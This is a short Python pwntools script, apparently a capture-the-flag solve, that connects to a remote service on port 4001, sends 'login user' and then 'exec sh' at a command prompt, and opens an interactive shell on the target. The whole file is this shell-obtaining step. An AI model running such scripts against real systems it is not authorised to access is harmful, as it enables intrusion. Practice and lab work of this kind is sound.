from pwn import context, remote

# config globale pwntools
context.update(arch="amd64", timeout=0.5)

p = remote("cytech.tcdn.casa", 4001)
p.sendlineafter(b"CMD> ", b"login user")
p.sendlineafter(b"CMD> ", b"exec sh")
p.interactive()
